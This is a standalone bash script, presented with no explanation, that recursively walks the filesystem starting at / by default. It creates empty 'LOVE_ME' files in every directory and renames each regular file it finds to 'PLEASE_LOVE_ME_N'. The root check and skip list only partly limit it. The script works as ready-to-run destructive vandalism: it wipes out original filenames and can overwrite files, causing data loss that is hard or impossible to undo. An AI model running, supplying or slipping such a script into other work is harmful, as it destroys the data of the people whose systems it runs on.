#!/bin/bash

SKIP_DIRS=(
    /proc /sys /run /dev
    /bin /sbin
    /lib /lib64
    /boot /tmp
    /usr
    /etc
    /etc/systemd /etc/init.d
)

# Safety checks
[ -d "/usr/bin" ] || { echo "ABORT: /usr/bin missing"; exit 1; }
if [ "$EUID" -eq 0 ] && [ "$2" != "--allow-root" ]; then
    echo "ABORT: refusing to run as root"
    exit 1
fi

should_skip() {
    local target="${1%/}"
    for skip in "${SKIP_DIRS[@]}"; do
        [ "$target" = "$skip" ] && return 0
    done
    return 1
}

traverse() {
    local dir="$1"
    local depth="${2:-0}"

    for entry in "$dir"/*/; do
        [ -e "$entry" ] || continue
        entry="${entry%/}"

        should_skip "$entry" && continue

        if [ -d "$entry" ]; then
            traverse "$entry" $((depth + 1))

            # Pure bash - no touch command
            for i in {1..20}; do
                > "$entry/LOVE_ME_${i}"
            done
        fi
    done

    # Pure bash - no dirname command
    local count=50
    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${count}"
        ((count++))
    done
}

traverse "${1:-/}"